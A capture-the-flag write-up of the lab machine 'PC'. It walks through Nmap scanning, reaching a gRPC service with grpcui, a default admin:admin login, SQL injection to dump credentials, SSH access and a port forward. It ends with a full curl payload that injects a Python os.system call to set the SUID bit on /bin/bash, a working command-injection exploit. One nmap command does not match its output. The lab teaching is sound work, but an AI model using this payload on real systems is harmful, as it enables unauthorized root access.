

![1](</Writeups/Machines/PC/img/logo.png>)
By Rug4lo

## Reconnaissance

First of all we're going to start with the reconnaissance of the machine:

Let's scan its ports with Nmap:
```bash
nmap -p- --open -T5 -sS -min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.214
```
```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-03 13:06 CEST
Initiating SYN Stealth Scan at 13:06
Scanning 10.10.11.214 [65535 ports]
Discovered open port 22/tcp on 10.10.11.214
Discovered open port 50051/tcp on 10.10.11.214
Completed SYN Stealth Scan at 13:06, 39.50s elapsed (65535 total ports)
Nmap scan report for 10.10.11.214
Host is up, received user-set (0.10s latency).
Scanned at 2023-09-03 13:06:03 CEST for 40s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack ttl 63
50051/tcp open  unknown syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.59 seconds
           Raw packets sent: 196631 (8.652MB) | Rcvd: 31 (1.364KB)
```
Next we're going to run a scan with nmap's basic reconnaissance scripts
```bash
nmap -sCV -p80,51045,51193,54585,59179 192.168.1.8 -oN targeted
```
```bash
Nmap scan report for 10.10.11.214
Host is up (0.11s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port50051-TCP:V=7.93%I=7%D=9/2%Time=64F36748%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06
SF:\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GenericL
SF:ines,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(GetReq
SF:uest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(HTTPOp
SF:tions,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RTSPR
SF:equest,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(RPCC
SF:heck,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0")%r(DNSVer
SF:sionBindReqTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\x
SF:ff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0"
SF:)%r(DNSStatusRequestTCP,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\
SF:x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
SF:\0\?\0\0")%r(Help,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\
SF:?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0
SF:\0")%r(SSLSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05
SF:\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\
SF:?\0\0")%r(TerminalServerCookie,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
SF:0\0\0\0\0\?\0\0")%r(TLSSessionReq,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\
SF:xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08
SF:\0\0\0\0\0\0\?\0\0")%r(Kerberos,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(SMBProgNeg,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
SF:\0\0\0\0\0\?\0\0")%r(X11Probe,2E,"\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\
SF:xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0
SF:\0\0\0\0\?\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep  2 18:48:19 2023 -- 1 IP address (1 host up) scanned in 18.18 seconds
```
If we look up information about port 50051 we'll see that it normally runs the gRPC service, which we won't be able to reach in the usual way

This is what happens if we connect to it normally 

![1](</Writeups/Machines/PC/img/1.png>)

To reach this port we'll use a tool called grpcui

This is the tool's repo ---> https://github.com/fullstorydev/grpcui

We can use it like this:
```bash
grpcui -plaintext 10.10.11.214:50051
```

## Access to the Admin user

Running the previous command will take us to this page 

![1](</Writeups/Machines/PC/img/2.png>)

Poking around a bit here we can see that if we register a user and log in as that user we're given an id and a JWT 

If we try to log in as admin:admin we'll see that it lets us in and gives us that user's JWT 

![1](</Writeups/Machines/PC/img/3.png>)

With this information we can go to the getInfo section and look up the admin's information (the token is what's between the quotes, not including the b)

![1](</Writeups/Machines/PC/img/4.png>)

when we hit invoke we can see that it does nothing for us, but that we can send as many requests as we want, so we can send it over to burpsuite 

![1](</Writeups/Machines/PC/img/5.png>)

## Exploiting the SQLI 

We can see that an id field is sent, so we can try a SQL Injection

![1](</Writeups/Machines/PC/img/6.png>)

Which will work, and from there we can start dumping databases and tables until we reach the one we're interested in (accounts) and then pull out the usernames

![1](</Writeups/Machines/PC/img/7.png>)

and also pull out the passwords

![1](</Writeups/Machines/PC/img/8.png>)

Now that we have the passwords we can connect as the user Sau over ssh
```bash
ssh sau@10.10.11.214
```
Once inside we can read the user flag

## Privilege escalation 

Now we'll look for open ports inside the machine 
```bash
netstat -nat
```
```bash
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN     
tcp        0     36 10.10.11.214:22         10.10.14.103:54228      ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::50051                :::*                    LISTEN     
tcp6       0      0 10.10.11.214:50051      10.10.14.103:35520      ESTABLISHED
```
we can see that port 8000 is open, so we can set up a port forward 
```bash
ssh -L 8000:127.0.0.1:8000 sau@10.129.37.201
```
When we browse to it we'll see this page

![1](</Writeups/Machines/PC/img/9.png>)

After digging a bit I found that there was a vuln in this service that allowed us to execute commands

We would just have to run this command in the ssh shell (in the os.system part, the command we want to run, urlencoded, in this case **chmod u+s /bin/bash**)
```bash
curl -i -s -k -X $'POST' \
    --data-binary $'jk=pyimport%20os;os.system(\"%63%68%6d%6f%64%20%75%2b%73%20%2f%62%69%6e%2f%62%61%73%68 \");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
    $'http://127.0.0.1:8000/flash/addcrypted2'
```